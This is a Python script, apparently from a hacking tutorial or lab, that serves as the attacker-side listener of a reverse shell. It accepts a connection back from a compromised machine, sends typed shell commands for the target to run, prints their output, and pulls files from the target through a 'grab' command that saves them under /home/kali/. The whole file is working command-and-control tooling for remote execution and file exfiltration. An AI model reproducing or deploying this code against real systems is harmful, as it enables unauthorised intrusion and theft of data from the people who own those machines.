#####################
#Attacker side
#Create listener (1)
#Wait for script is executed from target side (2), then execute command (3)
# (5) Read output command or file
import socket

####################
# transfer : s
# intput : conn socket object, command is command send to target
def transfer(conn,command):
	conn.send(command.encode())
	grab, path = command.split('*')
	f=open('/home/kali/'+path, 'wb')
	while True:
		bits =conn.recv(1024)
		#Check if file done
		if bits.endswith('DONE'.encode()):
			f.write(bits[:-4]) #remove DONE from file
			f.close()
			print ('[1] Transfer completed')
			break
		if 'File not found'.encode() in bits:
			print ('[2] Unable to found the file')
			break
		f.write(bits) #keep writing until we see done

####################
# connect : create connectivity with target
# no intput 
def connect():
    s = socket.socket()
    #Listen local
    s.bind(("192.168.0.1",8080))
    #backlogsize one session, max connexion is one
    s.listen(1)
    #accepted inbound connexion, return object conn and target IP address
    con , addr = s.accept()
    print ('[1] connexion from', addr)

    #Wait for cmd input and send to target
    while True:
        command = input("Shell> ")

        #if we want to terminate the session 
        if 'terminate' in command:
            con.send('terminate'.encode()) #send cmd in bytes
            con.close() #close socket in our side
            break #quit the loop
        #for file transfer
        elif 'grab' in command:
            transfer(con, command)
        else:
            con.send(command.encode()) #send back the received cmd
            print (con.recv(1024).decode()) #get 1 kilobyte of received data

#####################
#Execute in Attacker side (Kali)		
def main():
    connect()

main()


